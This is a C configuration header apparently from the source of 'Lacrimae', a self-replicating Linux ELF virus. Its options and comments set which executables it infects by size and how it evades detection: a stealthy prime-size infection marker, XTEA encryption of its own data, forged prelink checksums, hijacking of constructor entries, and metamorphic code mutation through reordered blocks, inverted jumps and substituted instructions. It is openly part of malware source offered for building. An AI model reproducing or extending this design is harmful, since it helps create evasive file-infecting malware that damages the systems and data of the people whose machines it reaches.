#ifndef	CONFIG_H
#define	CONFIG_H

/* DEBUG*
 * DEBUG prevents virus from forking into background, produce the message
 * at the end of execution; DEBUG_TRACE outputs traces of mark() routine;
 * see Makefile for details on DEBUG_ALLOC; DEBUG_JUMPS produce error
 * messages about incorrectly assembled jumps (if any)
 */
//#define	DEBUG
//#define	DEBUG_JUMPS
//#define	DEBUG_TRACE
//#define	DEBUG_ALLOC
//#define	DEBUGx1

/* min and max victim sizes */
#define	MIN_SIZE	16*1024
#define	MAX_SIZE	512*1024
#ifdef	DEBUG
#undef	MIN_SIZE
#define	MIN_SIZE	1024
#endif

/* MAX_IMPORTS
 * The maximum number of functions that could be imported by virus from libc.
 * If you're going to add the code, don't forget to adjust this constant,
 * otherwise the memory will be corrupted.
 */
#define	MAX_IMPORTS	32

/* ADVANCED_MARKER
 * Instead of setting the infection marker in the header, the virus will
 * increase the file size to the nearest prime. The primality tests using
 * the sieve of Eratosthenes. This options requires additional MAX_SIZE/16
 * bytes of memory. Don't be afraid, the code is fast enough - ~20ms for
 * initialization on my test box and uses 32K of memory. The largest delta
 * between any given n \in [1 .. 1 x 10^6] and prime number m (m > n) is
 * 113 bytes, so the files will not grow too much. Disadvantage is that
 * the files with the prime size will not be infected, but how often did
 * you see that? And. This will break the prelink -y stuff. "prelinked
 * file size differs". Anyway this was added just to show how to avoid
 * obvious markers.
 */
//#define	ADVANCED_MARKER

/* ENCRYPT_*
 * The virus may encrypt its own block of data in the .data section.
 * ENCRYPT_ROUNDS and ENCRYPT_DELTA are parameters to the XTEA functions.
 * DATA_GARBAGE is the number of random bytes to be added after the
 * virus data (set it to 0 to disable the feature).
 */
#define	ENCRYPT_DATA
#define	ENCRYPT_ROUNDS	31
#define	ENCRYPT_DELTA	0x9E3779B9
#define	DATA_GARBAGE	128

/* PRELINK_PEREFECT
 * Normally, the virus changes the .got.plt and .rel.plt in such a way
 * that all symbols required by virus will be computed at run-time with
 * the aid from dynamic linker. With this option turned on, Lacrimae
 * will try to resolve libc' symbols on its own, and will recalculate
 * prelink checksum, so the file will pass the check with -y prelink'
 * option. The option was introduced since vesrion 0.25.8, and still
 * has a "bug" with weak symbols, like I/O functions which could be
 * reloaded by pthread.so */
#define	PRELINK_PERFECT

/* PARSE_VERSIONR
 * The virus need to fill the correct version information for the symbols
 * it's using. Without this option, the version index will be equal to the
 * one of __libc_start_main() function. With this option turned on the
 * virus will parse .gnu.version_r section for the lowest libc version.
 * See "ELF symbol versioning with glibc 2.1 and later" at
 * http://lists.debian.org/lsb-spec/1999/12/msg00017.html for details on
 * symbol versioning. Option was introduced since version 0.25.8.
 */
#define	PARSE_VERSIONR

/* EXTEND_CTOR
 * Do not touch .init, gain control via CTORS entry */
#define	EXTEND_CTOR

/* FORCE_ALIGN
 * forcedly align the functions at paragraph boundary
 */ 
#define	FORCE_ALIGN

/* M_BRO
 * Reorder blocks
 */
#define	M_BRO
#define	M_BRO_PROB	16

/* MUTATE
 * Mutate instructions "demo", 1-4 from RPME, 5 from BI-PERM
 * MUTATEx1 - add/sub r,imm <> sub/add r,-imm <> lea/lea r,[r + imm/-imm]
 */
#define	MUTATE
#define	MUTATE1		4
#define	MUTATE2		5
#define	MUTATE3		4
#define	MUTATE4		5
#define	MUTATE5		4
#define	MUTATEx1

/* M_IJCC
 * Invert conditional jumps
 * 	or	eax, eax    =>		or	eax, eax
 * 	jz	A			jnz	A'
 * 	call	foo		A'':	ret
 * A:	ret			A':	call	foo
 *					jmp	A''
 */
#define	M_IJCC
#define	M_IJCC_PROB	4

/* OJMP
 * When the virus and the victim will be merged many of the short jumps might
 * go out of range. The solution is to either convert all short jumps to their
 * near equivalents (until v.28). With this option enabled the virus will convert
 * only those jumps that really needs it.
 */
#define	OJMP

#endif	/* CONFIG_H */
